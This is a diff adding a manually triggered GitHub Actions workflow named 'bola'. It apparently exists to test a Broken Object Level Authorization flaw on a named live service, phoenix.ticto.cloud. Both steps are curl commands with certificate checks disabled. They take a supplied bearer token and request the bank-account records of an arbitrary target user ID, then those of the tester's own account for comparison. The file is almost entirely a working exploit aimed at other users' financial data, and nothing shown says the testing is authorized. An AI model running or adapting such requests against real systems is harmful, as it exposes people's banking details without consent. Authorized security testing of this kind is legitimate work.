@@ -1,0 +1,25 @@
+name: bola
+on:
+  workflow_dispatch:
+    inputs:
+      user_id:
+        required: true
+        default: '101'
+      token:
+        required: true
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: BOLA READ target user
+        run: |
+          curl -sk -w "\nHTTP:%{http_code}\n" \
+            "https://phoenix.ticto.cloud/api/v1/private/users/${{ inputs.user_id }}/manage/bank-accounts" \
+            -H "Authorization: Bearer ${{ inputs.token }}" \
+            -H "Accept: application/json"
+      - name: BOLA READ own account 1338731
+        run: |
+          curl -sk -w "\nHTTP:%{http_code}\n" \
+            "https://phoenix.ticto.cloud/api/v1/private/users/1338731/manage/bank-accounts" \
+            -H "Authorization: Bearer ${{ inputs.token }}" \
+            -H "Accept: application/json"
